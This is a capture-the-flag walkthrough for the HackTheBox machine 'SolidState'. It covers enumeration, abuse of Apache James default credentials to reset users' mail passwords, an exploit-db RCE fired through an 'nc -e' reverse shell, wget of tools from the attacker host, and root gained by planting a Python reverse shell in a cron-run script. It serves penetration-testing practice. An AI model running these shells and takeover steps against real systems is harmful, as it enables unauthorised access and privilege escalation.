# SolidState: Medium

```sh
sudo vim /etc/hosts
# add solidstate.htb

nmap -T4 -p- -A -Pn -v solidstate.htb
```

* open ports & services:

    * 22/tcp: ssh: OpenSSH 7.4p1 Debian 10+deb9u1
    * 25/tcp: smtp
    * 80/tcp: http: Apache httpd 2.4.25
    * 110/tcp: pop3
    * 119/tcp: nntp
    * 4555/tcp: rsip

* the webpage on port 80 is for 'Solid State Security', and the webpage content does not contain anything interesting

* the footer mentions an email 'webadmin@solid-state-security.com', and there are a couple of outgoing links to '/services.html' and '/about.html': but they don't have any useful data

* web enum:

    ```sh
    feroxbuster -u http://solidstate.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,js,md --extract-links --scan-limit 3 --filter-status 400,401,404,405,500 --silent
    # dir scan with small wordlist

    ffuf -c -u 'http://solidstate.htb' -H 'Host: FUZZ.solidstate.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 7776 -s
    # subdomain scan
    ```

* enumerating SMTP:

    ```sh
    telnet solidstate.htb 25

    VRFY root
    # VRFY is not supported

    EXPN root
    # EXPN is not supported

    QUIT
    ```

* checking the service on port 119, Google shows it is associated with NNTP (Network News Transfer Protocol)

* [enumerating NNTP](https://0xffsec.com/handbook/services/nntp/):

    ```sh
    nc solidstate.htb 119
    # banner shows message - '200 solidstate NNTP Service Ready, posting permitted'

    telnet solidstate.htb 119
    # same banner seen here

    # try connecting as a client

    openssl s_client -crlf -connect solidstate.htb:119
    # this gives SSL certificate errors
    ```

* checking the service on port 4555, we can try interacting with it using ```nc``` but it does not work

* if we try accessing it as a webpage at 'http://solidstate.htb:4555', it loads for a long time, before we get a few login error messages for 'JAMES Remote Administration Tool 2.3.2'

* we can try interacting with it using ```curl```, but we get the error "Received HTTP/0.9 when not allowed": if we try with the ```--http0.9``` flag we get a similar response as the webpage

* we can try checking it using ```telnet``` - and using the command ```telnet solidstate.htb 4555``` prompts us for 'login id' and 'password' fields for logging into the tool: but we do not have any valid creds

* we can try searching for exploits associated with this tool: this leads to multiple RCE exploits for Apache James Server 2.3.2

* we can try [one of the authenticated RCE scripts](https://www.exploit-db.com/exploits/50347): this uses the default creds 'root:root':

    ```sh
    nc -nvlp 5555
    # setup listener

    python3 50347.py solidstate.htb 10.10.14.18 5555
    # the exploit works

    # to trigger the payload, we need someone to log in via SSH
    ```

* the exploit requires someone to log into the target via SSH, but this does not happen after several minutes: so we need to find another vector

* as we have valid creds for Apache James: 'root:root': we can try logging in and checking other functionalities

* Google shows that we can modify user passwords via Apache James, so we can try this:

    ```sh
    telnet solidstate.htb 4555
    # when prompted for 'login id' and 'password', submit 'root' as values

    HELP
    # shows supported commands

    listusers
    # shows multiple users

    setpassword thomas testpass123
    # set new password for one of the users

    quit
    ```

    * from Apache James, ```listusers``` mentions multiple users:

        * james
        * thomas
        * john
        * mindy
        * mailadmin
    
    * we can try modifying the password for one of the users like 'thomas': via the ```setpassword``` command

* as we have set a new password for user 'thomas', we can try logging in with these new creds to other exposed services like SMTP and POP3:

    ```sh
    telnet solidstate.htb 110
    # connect to POP3 service

    USER thomas

    PASS testpass123
    # this works

    LIST
    # no emails found

    QUIT
    ```

* checking the mail inbox for 'thomas' does not give any emails: but we can continue checking for all other users mentioned:

    ```sh
    telnet solidstate.htb 4555
    # login to Apache James with 'root:root'

    # change password for other users as well
    
    setpassword james jamespass123
    
    setpassword john johnpass123
    
    setpassword mindy mindypass123
    
    setpassword mailadmin mailpass123

    quit
    ```

    ```sh
    telnet solidstate.htb 110
    # connect to IMAP

    USER james

    PASS jamespass123

    LIST
    # no mails found
    
    QUIT
    ```

    ```sh
    telnet solidstate.htb 110

    USER john

    PASS johnpass123

    LIST
    # we have one email

    RETR 1
    # fetch email

    QUIT
    ```

    ```sh
    telnet solidstate.htb 110

    USER mindy

    PASS mindypass123

    LIST
    # 2 mails found

    RETR 1

    RETR 2

    QUIT
    ```    

* after changing the password for remaining users, if we log into the POP3 service as 'john', we get a mail saying user 'mindy' will be sent a temporary password

* logging into POP3 as 'mindy' gives the SSH credentials 'mindy:P@55W0rd1!2@': we can login now:

    ```sh
    ssh mindy@solidstate.htb
    # this works

    id
    # rbash error - "command not found"

    whoami
    # rbash error

    ls
    # this works

    ls bin
    # includes a few commands
    ```

* the user 'mindy' seems to have a restricted shell as ```rbash``` is used, and only a couple of commands are supported

* however, as we have valid SSH creds now, we can use it with the exploit found earlier: which needs a SSH login to trigger the reverse shell

* we can run the exploit again:

    ```sh
    nc -nvlp 5555
    # setup listener

    vim 50347.py
    # modify the script to use the payload 'nc -e /bin/sh <ip> <port'
    # as the other given payload does not work

    python3 50347.py solidstate.htb 10.10.14.18 5555
    ```

* to trigger the payload, log into SSH as 'mindy' again: this time it works and we get a reverse shell

* in reverse shell, we do not have a restricted shell anymore:

    ```sh
    id
    # 'mindy'

    # stabilise shell
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z
    stty raw -echo; fg
    # Enter twice

    ls -la

    cat user.txt
    # user flag

    sudo -l
    # sudo not found

    ls -la /home
    # we have another user 'james'

    ls -la /home/james
    # check for any secrets

    ls -la /var
    # check for any interesting folders

    ls -la /opt
    # we have some non-default files here

    cat /opt/tmp.py
    ```

* we have a non-default script ```/opt/tmp.py```, which is completely writable by us

* the Python script does not have anything interesting: it just clears all files from ```/tmp```:

    ```py
    #!/usr/bin/env python
    import os
    import sys
    try:
        os.system('rm -r /tmp/* ')
    except:
        sys.exit()
    ```

* as it is writable by us, we need to see if this Python script is being used or referenced somewhere

* we can use ```pspy``` to check for any cronjobs: fetch executable from attacker:

    ```sh
    wget http://10.10.14.18:8000/pspy64

    chmod +x pspy64

    ./pspy64
    # this fails due to binary format
    # we need to use 32-bit version instead

    wget http://10.10.14.18:8000/pspy32

    chmod +x pspy32

    ./pspy32
    ```

* ```pspy``` shows that the command ```python /opt/tmp.py``` is executed by UID=0 ('root' user) every few minutes

* we can use this to get a reverse shell: modify the python script with a revshell script:

    ```sh
    # on attacker
    nc -nvlp 6666
    # setup listener
    ```

    ```sh
    # on target
    
    which vi
    # vi is installed

    vi /opt/tmp.py
    # modify to include the revshell commands
    ```

    ```py
    #!/usr/bin/env python
    import socket,subprocess,os
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("10.10.14.18",6666))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    import pty
    pty.spawn("sh")
    ```

* this works and within a few minutes we get a reverse shell:

    ```sh
    id
    # root

    cat /root/root.txt
    # root flag
    ```
